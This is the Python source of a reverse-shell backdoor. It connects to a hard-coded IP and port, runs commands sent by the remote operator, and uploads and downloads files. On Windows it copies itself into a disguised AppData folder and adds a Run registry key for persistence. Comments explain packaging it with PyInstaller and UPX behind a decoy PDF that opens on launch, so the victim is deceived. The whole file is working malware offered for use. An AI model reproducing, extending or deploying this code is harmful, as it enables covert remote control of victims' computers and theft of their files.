import socket
from subprocess import check_output, CalledProcessError, DEVNULL, call, Popen
from json import dumps, loads, decoder
from os import chdir, environ, mkdir, path, getcwd
from time import sleep
import sys
from shutil import copyfile
from platform import system
from getpass import getuser

# wine pyinstaller backdoor.py --onefile --noconsole
# --add-data "locationfile;where to save"
# wine pyinstaller --add-data "/home/webins/Downloads/evading.pdf;." --onefile --noconsole backdoor/backdoor.py
# use upx to compress binary executable
# encrypt the code and then decrypt
# add a icon pyinstaller --icon path
# research-on-human-reflexe.pdf


class Backdoor:
    def __init__(self, ip, port):
        if system() == 'Windows':
            self.window_persistency()
            self.enc = 'cp1252'
        elif system() == 'Linux':
            self.linux_persitency()
            self.enc = 'utf-8'
        else:
            self.enc = 'utf-8'
        self.ip = ip
        self.port = port
        self.time = (60, 60*2, 60*3, 60*4, 60*5,
                     60*10, 60*60, 60*60*3, 60*60*12)
        self.actual_time = 0
        self.start_socket()
        self.host = socket.gethostname()

    def start_socket(self):
        try:
            self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.conn.connect((self.ip, self.port))
        except ConnectionRefusedError:
            # there is no one listening
            sleep(self.time[self.actual_time])
            self.actual_time += 1
            self.conn.close()
            self.start_socket()
            self.start()

    def window_persistency(self):
        directory = environ['appdata'] + "\\Win10-ext"
        file_location = directory+"\\Win-dd.exe"
        if not path.exists(directory):
            mkdir(directory)
            mkdir(directory + "\\Win-sys1")
            mkdir(directory + "\\Win-net-1")
            call(f"type NUL > {directory}\\Win10-eed.batch",
                 shell=True, stderr=DEVNULL, stdin=DEVNULL)
            call(f"type NUL > {directory}\\Win10-41.cfg",
                 shell=True, stderr=DEVNULL, stdin=DEVNULL)
            call(f"type NUL > {directory}\\Win10-d.txt",
                 shell=True, stderr=DEVNULL, stdin=DEVNULL)
            if not path.exists(file_location):
                copyfile(sys.executable, file_location)
                call(
                    f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run \v update \t REG_SZ \d "{file_location}"')

    def linux_persitency(self):
        pass

    def send_banner(self):
        user = getuser()
        pwd = getcwd()
        banner = f"{self.host}@{user}:~{pwd}$ "
        self.send(banner)

    def send(self, data):
        json_data = dumps(data)
        self.conn.send(json_data.encode(self.enc))

    def receive(self, size=1024):
        json_data = b""
        while True:
            try:
                json_data += self.conn.recv(size)
                return loads(json_data.decode(self.enc))
            except decoder.JSONDecodeError:
                continue

    def read_file(self, path):
        with open(path, 'rb') as file:
            result = file.read().decode(self.enc)
            self.send(result)

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(content.encode(self.enc))

    def start(self):
        try:
            while True:
                self.send_banner()
                self.actual_time = 1
                command = self.receive()

                if command[0] == 'cd' and len(command) > 1:
                    chdir(command[1])
                    self.send("cd into " + command[1])

                elif command[0] == 'download':
                    self.read_file(command[1])

                elif command[0] == 'upload':
                    result = self.receive()
                    self.write_file(command[1], result)

                else:
                    try:
                        output = check_output(
                            command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
                    except CalledProcessError as e:
                        self.send(f"{e.cmd} Error: {e.returncode}")
                    else:
                        self.send(output.decode(self.enc))

        except BrokenPipeError:
            self.conn.close()
            self.start_socket()
            self.start()
        except socket.error as e:
            # socket.error: [Errno 113] No route to host catch
            if e == 113:
                sys.exit()
        except Exception:
            pass

file_name = sys._MEIPASS + "\evading.pdf"
Popen(file_name, shell=True)
backdoor = Backdoor("192.168.1.114", 4444)
backdoor.start()
